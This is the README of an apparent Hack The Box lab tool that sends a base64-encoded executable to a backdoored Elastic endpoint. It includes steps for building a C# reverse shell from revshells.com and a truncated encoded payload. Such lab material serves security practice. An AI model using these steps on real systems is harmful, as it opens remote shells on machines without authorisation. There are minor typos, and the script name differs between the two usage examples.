# Naplistener script
A simple script that I made for a `HTB` machine that exposes an infected endpoint with `Elastic`

## Usage

```shell-session
$python3 naplistener.py https://10.10.10.10 -c '<some-64-encoded-command-here>'
```


To make it work:
- Go to [https://revshells.com](https//revshells.com), select `C# TCP Client`
- Modify the code adding a `namespace` and a `Run` class
- Install `Mono C# Compilter` (`m̀cs`) with `sudo apt install mono-devel -y`
- Compile the `payload.cs` file from `Revshells` with `mcs -out:payload.exe payload.cs`
- Then run `base64 -w0 payload.exe`, copy the payload and paste it as `command` to this script:

```shell-session
$ python3 naplistener_exploit.py -t https://10.10.10.10 -c 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQgA<SNIP>AAAAAAAAAAAAA'
```
